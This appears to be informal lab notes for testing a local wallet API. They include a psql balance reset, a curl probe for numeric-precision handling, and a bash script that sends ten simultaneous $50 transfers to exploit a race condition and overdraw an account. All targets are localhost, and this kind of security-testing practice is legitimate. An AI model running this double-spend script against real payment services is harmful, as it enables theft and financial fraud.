reseting the database
export PGPASSWORD='password'
psql -h localhost -U sanchez -d wallet_db -c "UPDATE wallets SET balance = 100.00 WHERE user_id = 101;"


attack for numeric precison
curl -X POST http://localhost:3000/wallet/transfer \
-H "Content-Type: application/json" \
-d '{"fromId": 101, "toId": 102, "amount": 0.009}'

check the result
curl -s http://localhost:3000/wallet/101

📝 Create the Attack Script
1. Create the file: Run this in your terminal (make sure you are in the ~/real-wallet-lab folder):

Bash
nano attack.sh
2. Paste this code exactly: (This script uses curl to send 10 requests at the exact same moment).

Bash
#!/bin/bash

# Target: Your Local Bank
URL="http://localhost:3000/wallet/transfer"

# The Plan: Move $50 ten times (Total $500), but we only have $50.
# If the bank is secure, 1 should succeed and 9 should fail.
# If the bank is VULNERABLE, all 10 might succeed (creating negative balance).

echo "Starting Attack on $URL..."

# Fire 10 requests in parallel
for i in {1..10}
do
   curl -s -X POST $URL \
   -H "Content-Type: application/json" \
   -d '{"fromId": 101, "toId": 102, "amount": 50}' &
done

# Wait for all background jobs to finish
wait
echo "Attack Complete."
3. Save and Exit:

Press Ctrl+O, then Enter (to save).

Press Ctrl+X (to exit).

4. Make it Executable (Arm the Weapon):

Bash
chmod +x attack.sh
🚀 The Final Sequence
1. Start the Bank Server (Terminal Tab 1):

Bash
npx ts-node src/server.ts
(Wait for: [MAX_OP] Bank running on Localhost:3000)

2. Launch the Attack (Terminal Tab 2):

Bash
./attack.sh
3. Check the Damage (Terminal Tab 2): After the attack finishes, check the balance of the victim (User 101).

Bash
curl http://localhost:3000/wallet/101